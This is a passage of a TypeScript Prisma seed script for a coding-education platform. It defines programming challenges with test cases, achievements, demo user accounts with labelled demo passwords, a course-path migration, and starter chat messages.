    prompt: 'Write `solve(nums, target)` that returns the index of `target` in the sorted list `nums`, or `-1` if it is not present.',
    entryPoint: 'solve',
    starterCode: {
      python: 'def solve(nums, target):\n    pass\n',
      javascript: 'function solve(nums, target) {\n  \n}\n',
      typescript: 'function solve(nums: number[], target: number): number {\n  \n}\n',
    },
    testCases: [
      { input: [[1, 3, 5, 7, 9], 5], expectedOutput: 2, isHidden: false },
      { input: [[1, 3, 5, 7, 9], 4], expectedOutput: -1, isHidden: false },
      { input: [[2, 4, 6, 8, 10, 12], 12], expectedOutput: 5, isHidden: true },
    ],
  },
  {
    slug: 'lua-table-sum',
    title: 'Lua: Table Sum',
    difficulty: 'EASY',
    languages: ['LUA'],
    prompt: 'Write `solve(nums)` that returns the sum of all numbers in the Lua table `nums`.',
    entryPoint: 'solve',
    starterCode: {
      lua: 'function solve(nums)\n  \nend\n',
    },
    testCases: [
      { input: [[1, 2, 3]], expectedOutput: 6, isHidden: false },
      { input: [[10, -2, 5]], expectedOutput: 13, isHidden: false },
      { input: [[100, 250, -50]], expectedOutput: 300, isHidden: true },
    ],
    instructorAuthored: true,
  },
  {
    slug: 'lua-word-count',
    title: 'Lua: Word Count',
    difficulty: 'MEDIUM',
    languages: ['LUA'],
    prompt:
      'Write `solve(s)` that returns the number of whitespace-separated words in the string `s`. Use a Lua pattern with `gmatch` rather than splitting on a single space, so runs of extra whitespace don\'t produce empty "words".',
    entryPoint: 'solve',
    starterCode: {
      lua: 'function solve(s)\n  \nend\n',
    },
    testCases: [
      { input: ['hello world'], expectedOutput: 2, isHidden: false },
      { input: ['Lua is fun'], expectedOutput: 3, isHidden: false },
      { input: ['   spaced   out   '], expectedOutput: 2, isHidden: true },
    ],
    instructorAuthored: true,
  },
  {
    slug: 'html-build-a-heading',
    title: 'HTML: Build a Heading',
    difficulty: 'EASY',
    languages: ['HTML'],
    prompt:
      'Write HTML markup containing a single `<h1>` element whose text is exactly "Hello, Kodstigen!".\n\nHTML challenges aren\'t graded by calling a function - each test case checks something about the rendered markup instead (does an element exist, what text does it contain, how many are there).',
    entryPoint: 'render',
    starterCode: {
      html: '<!-- Write your HTML here -->\n<h1></h1>\n',
    },
    testCases: [
      { input: [{ selector: 'h1', extract: 'exists' }], expectedOutput: true, isHidden: false },
      { input: [{ selector: 'h1', extract: 'text' }], expectedOutput: 'Hello, Kodstigen!', isHidden: false },
      { input: [{ selector: 'h1', extract: 'count' }], expectedOutput: 1, isHidden: true },
    ],
    instructorAuthored: true,
  },
  {
    slug: 'html-build-a-nav-list',
    title: 'HTML: Build a Nav List',
    difficulty: 'MEDIUM',
    languages: ['HTML'],
    prompt:
      'Write HTML markup for a navigation list: a `<ul class="nav-list">` containing exactly 3 `<li>` elements, each wrapping an `<a>` link.',
    entryPoint: 'render',
    starterCode: {
      html: '<!-- Build your nav list here -->\n',
    },
    testCases: [
      { input: [{ selector: 'ul.nav-list', extract: 'exists' }], expectedOutput: true, isHidden: false },
      { input: [{ selector: 'ul.nav-list li', extract: 'count' }], expectedOutput: 3, isHidden: false },
      { input: [{ selector: 'ul.nav-list li a', extract: 'count' }], expectedOutput: 3, isHidden: true },
    ],
    instructorAuthored: true,
  },
  {
    slug: 'c-sum-two-numbers',
    title: 'C: Sum Two Numbers',
    difficulty: 'EASY',
    languages: ['C'],
    prompt:
      'Write `int solve(int a, int b)` that returns the sum of `a` and `b`.\n\nC challenges are always graded on an `int` return value, since the browser-based interpreter has no way to know your function\'s intended return type ahead of time.',
    entryPoint: 'solve',
    starterCode: {
      c: '#include <stdio.h>\n\nint solve(int a, int b) {\n  \n}\n',
    },
    testCases: [
      { input: [2, 3], expectedOutput: 5, isHidden: false },
      { input: [-1, 1], expectedOutput: 0, isHidden: false },
      { input: [100, 250], expectedOutput: 350, isHidden: true },
    ],
    instructorAuthored: true,
  },
  {
    slug: 'c-count-vowels',
    title: 'C: Count Vowels',
    difficulty: 'MEDIUM',
    languages: ['C'],
    prompt:
      'Write `int solve(char *s)` that returns the number of vowels (a, e, i, o, u, case-insensitive) in the C string `s`.',
    entryPoint: 'solve',
    starterCode: {
      c: '#include <stdio.h>\n\nint solve(char *s) {\n  \n}\n',
    },
    testCases: [
      { input: ['hello'], expectedOutput: 2, isHidden: false },
      { input: ['sky'], expectedOutput: 0, isHidden: false },
      { input: ['Programming'], expectedOutput: 3, isHidden: true },
    ],
    instructorAuthored: true,
  },
  {
    slug: 'c-binary-search',
    title: 'C: Binary Search',
    difficulty: 'HARD',
    languages: ['C'],
    prompt:
      'Write `int solve(int *nums, int len, int target)` that returns the index of `target` in the sorted array `nums` (which has `len` elements), or `-1` if it is not present.',
    entryPoint: 'solve',
    starterCode: {
      c: '#include <stdio.h>\n\nint solve(int *nums, int len, int target) {\n  \n}\n',
    },
    testCases: [
      { input: [[1, 3, 5, 7, 9], 5, 5], expectedOutput: 2, isHidden: false },
      { input: [[1, 3, 5, 7, 9], 5, 4], expectedOutput: -1, isHidden: false },
      { input: [[2, 4, 6, 8, 10, 12], 6, 12], expectedOutput: 5, isHidden: true },
    ],
    instructorAuthored: true,
  },
];

const achievements: {
  key: string;
  name: string;
  description: string;
  icon: string;
  metric: AchievementMetric;
  threshold: number;
}[] = [
  { key: 'first_lesson', name: 'First Steps', description: 'Complete your first lesson.', icon: '📘', metric: 'LESSONS_COMPLETED', threshold: 1 },
  { key: 'lessons_10', name: 'Halfway Hero', description: 'Complete 10 lessons.', icon: '📚', metric: 'LESSONS_COMPLETED', threshold: 10 },
  { key: 'first_quiz', name: 'Quiz Whiz', description: 'Pass your first quiz.', icon: '📝', metric: 'QUIZZES_PASSED', threshold: 1 },
  { key: 'quizzes_10', name: 'Quiz Master', description: 'Pass 10 quizzes.', icon: '🧠', metric: 'QUIZZES_PASSED', threshold: 10 },
  { key: 'first_challenge', name: 'Code Warrior', description: 'Solve your first coding challenge.', icon: '💻', metric: 'CHALLENGES_SOLVED', threshold: 1 },
  { key: 'challenges_5', name: 'Challenge Crusher', description: 'Solve 5 coding challenges.', icon: '🏆', metric: 'CHALLENGES_SOLVED', threshold: 5 },
  { key: 'challenges_10', name: 'Challenge Champion', description: 'Solve 10 coding challenges.', icon: '👑', metric: 'CHALLENGES_SOLVED', threshold: 10 },
  { key: 'xp_100', name: 'XP Rookie', description: 'Earn 100 XP.', icon: '⚡', metric: 'XP', threshold: 100 },
  { key: 'xp_500', name: 'XP Grinder', description: 'Earn 500 XP.', icon: '⚡', metric: 'XP', threshold: 500 },
  { key: 'xp_1000', name: 'XP Legend', description: 'Earn 1000 XP.', icon: '🌟', metric: 'XP', threshold: 1000 },
  { key: 'streak_3', name: 'On Fire', description: 'Reach a 3-day streak.', icon: '🔥', metric: 'STREAK', threshold: 3 },
  { key: 'streak_7', name: 'Unstoppable', description: 'Reach a 7-day streak.', icon: '🔥', metric: 'STREAK', threshold: 7 },
];

async function seedChallenges(instructorId: string) {
  for (const [i, c] of challenges.entries()) {
    const owner = c.instructorAuthored ? instructorId : null;
    const existing = await prisma.challenge.findUnique({ where: { slug: c.slug } });
    if (existing) {
      await prisma.challenge.update({
        where: { slug: c.slug },
        data: {
          title: c.title,
          difficulty: c.difficulty,
          languages: c.languages,
          prompt: c.prompt,
          order: i,
          status: 'PUBLISHED',
          instructorId: owner,
        },
      });
      continue;
    }
    await prisma.challenge.create({
      data: {
        slug: c.slug,
        title: c.title,
        difficulty: c.difficulty,
        languages: c.languages,
        prompt: c.prompt,
        entryPoint: c.entryPoint,
        starterCode: c.starterCode,
        order: i,
        status: 'PUBLISHED',
        instructorId: owner,
        testCases: {
          create: c.testCases.map((tc, ti) => ({
            input: tc.input as Prisma.InputJsonValue,
            expectedOutput: tc.expectedOutput as Prisma.InputJsonValue,
            isHidden: tc.isHidden,
            order: ti,
          })),
        },
      },
    });
  }
  console.log(`  ✓ ${challenges.length} coding challenges`);
}

async function seedAchievements() {
  for (const a of achievements) {
    await prisma.achievement.upsert({ where: { key: a.key }, update: a, create: a });
  }
  console.log(`  ✓ ${achievements.length} achievements`);
}

async function main() {
  console.log('Seeding Kodstigen...');

  const [instructorPass, adminPass, studentPass] = await Promise.all([
    bcrypt.hash('instructor123', 10),
    bcrypt.hash('admin123', 10),
    bcrypt.hash('student123', 10),
  ]);

  const instructor = await prisma.user.upsert({
    where: { email: 'instructor@codeforge.dev' },
    update: { emailVerified: true },
    create: {
      username: 'ada_instructor',
      email: 'instructor@codeforge.dev',
      passwordHash: instructorPass,
      role: 'INSTRUCTOR',
      bio: 'Senior engineer teaching backend development.',
      emailVerified: true,
    },
  });

  await prisma.user.upsert({
    where: { email: 'admin@codeforge.dev' },
    update: { emailVerified: true },
    create: {
      username: 'admin',
      email: 'admin@codeforge.dev',
      passwordHash: adminPass,
      role: 'ADMIN',
      emailVerified: true,
    },
  });

  await prisma.user.upsert({
    where: { email: 'student@codeforge.dev' },
    update: { emailVerified: true },
    create: {
      username: 'demo_student',
      email: 'student@codeforge.dev',
      passwordHash: studentPass,
      role: 'STUDENT',
      emailVerified: true,
    },
  });

  // DevOps courses used to live under one combined "devops" path; split them back into
  // individual standalone paths (docker, azure, kubernetes, aws, cicd, observability) so each
  // gets its own big card on the Courses page and its own marquee logo on the landing page,
  // moving existing courses (and any real enrollments/progress/certificates already on them)
  // rather than recreating them, then removing the now-empty combined path.
  const devopsPath = await prisma.learningPath.findUnique({ where: { slug: 'devops' } });
  if (devopsPath) {
    const courseToSlug: Record<string, string> = {
      'Docker Fundamentals': 'docker',
      'Azure Fundamentals': 'azure',
      'Kubernetes Fundamentals': 'kubernetes',
      'AWS Fundamentals': 'aws',
      'CI/CD Fundamentals': 'cicd',
      'Logging and Observability': 'observability',
    };
    for (const [title, slug] of Object.entries(courseToSlug)) {
      const course = await prisma.course.findFirst({ where: { pathId: devopsPath.id, title } });
      if (!course) continue;
      const newPathSeed = paths.find((p) => p.slug === slug)!;
      const newPath = await prisma.learningPath.upsert({ where: { slug }, update: newPathSeed, create: newPathSeed });
      await prisma.course.update({ where: { id: course.id }, data: { pathId: newPath.id } });
      console.log(`  ↳ moved "${title}" out of devops into its own "${slug}" path`);
    }
    const remaining = await prisma.course.count({ where: { pathId: devopsPath.id } });
    if (remaining === 0) {
      await prisma.learningPath.delete({ where: { id: devopsPath.id } });
      console.log('  ↳ removed the now-empty "devops" path');
    }
  }

  for (const p of paths) {
    const path = await prisma.learningPath.upsert({
      where: { slug: p.slug },
      update: p,
      create: p,
    });

    for (const courseSeed of coursesByPath[p.slug] ?? []) {
      const existing = await prisma.course.findFirst({ where: { pathId: path.id, title: courseSeed.title } });
      if (existing) {
        if (existing.isPublic !== (courseSeed.isPublic ?? false)) {
          await prisma.course.update({
            where: { id: existing.id },
            data: { isPublic: courseSeed.isPublic ?? false },
          });
        }
        // refresh lesson text in place so content updates reach existing installs
        // without touching quizzes, enrollments, or student progress; lessons newly
        // added to the seed (beyond what already exists) are created with their quiz
        const current = await prisma.lesson.findMany({ where: { courseId: existing.id } });
        const byOrder = new Map(current.map((l) => [l.order, l]));
        for (const [i, lesson] of courseSeed.lessons.entries()) {
          const order = i + 1;
          const match = byOrder.get(order);
          if (match) {
            await prisma.lesson.update({
              where: { id: match.id },
              data: { title: lesson.title, content: lesson.content, requiresSubmission: lesson.requiresSubmission ?? false },
            });
          } else {
            await prisma.lesson.create({
              data: {
                courseId: existing.id,
                title: lesson.title,
                order,
                content: lesson.content,
                videoUrl: lesson.videoUrl ?? null,
                requiresSubmission: lesson.requiresSubmission ?? false,
                quiz: lesson.quiz
                  ? {
                      create: {
                        title: lesson.quiz.title,
                        passingScore: lesson.quiz.passingScore,
                        questions: {
                          create: lesson.quiz.questions.map((q, qi) => ({
                            type: q.type,
                            prompt: q.prompt,
                            options: q.options,
                            answer: q.answer,
                            order: qi + 1,
                          })),
                        },
                      },
                    }
                  : undefined,
              },
            });
          }
        }
        console.log(`  ✓ ${courseSeed.title} (content refreshed, ${courseSeed.lessons.length} lessons)`);
        continue;
      }

      await prisma.course.create({
        data: {
          ...(courseSeed.id ? { id: courseSeed.id } : {}),
          title: courseSeed.title,
          description: courseSeed.description,
          status: 'PUBLISHED',
          isPublic: courseSeed.isPublic ?? false,
          pathId: path.id,
          instructorId: instructor.id,
          lessons: {
            create: courseSeed.lessons.map((lesson, i) => ({
              title: lesson.title,
              order: i + 1,
              content: lesson.content,
              videoUrl: lesson.videoUrl ?? null,
              requiresSubmission: lesson.requiresSubmission ?? false,
              quiz: lesson.quiz
                ? {
                    create: {
                      title: lesson.quiz.title,
                      passingScore: lesson.quiz.passingScore,
                      questions: {
                        create: lesson.quiz.questions.map((q, qi) => ({
                          type: q.type,
                          prompt: q.prompt,
                          options: q.options,
                          answer: q.answer,
                          order: qi + 1,
                        })),
                      },
                    },
                  }
                : undefined,
            })),
          },
        },
      });
      console.log(`  ✓ ${courseSeed.title} (${courseSeed.lessons.length} lessons)`);
    }
  }

  await seedChallenges(instructor.id);
  await seedAchievements();

  const chatCount = await prisma.chatMessage.count();
  if (chatCount === 0) {
    const [admin, student] = await Promise.all([
      prisma.user.findUniqueOrThrow({ where: { email: 'admin@codeforge.dev' } }),
      prisma.user.findUniqueOrThrow({ where: { email: 'student@codeforge.dev' } }),
    ]);
    await prisma.chatMessage.createMany({
      data: [
        { room: 'general', userId: admin.id, content: 'Welcome to the Kodstigen community chat! 👋 Be kind, help each other, and keep it friendly.' },
        { room: 'general', userId: instructor.id, content: 'Hi everyone! I teach the backend courses here, ask me anything about Node.js or Express.' },
        { room: 'general', userId: student.id, content: 'Just passed my first Python quiz 🐍🔥' },
        { room: 'help', userId: instructor.id, content: 'Stuck on a lesson or challenge? Post it here with the error message and someone will help.' },
        { room: 'showcase', userId: admin.id, content: 'Finished a course project? Share a link or screenshot here, we love seeing what you build! 🚀' },
      ],
    });
    console.log('  ✓ starter chat messages');
  }

  console.log('Seed complete.');
  console.log('Demo accounts: student@codeforge.dev / student123, instructor@codeforge.dev / instructor123, admin@codeforge.dev / admin123');
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(() => prisma.$disconnect());
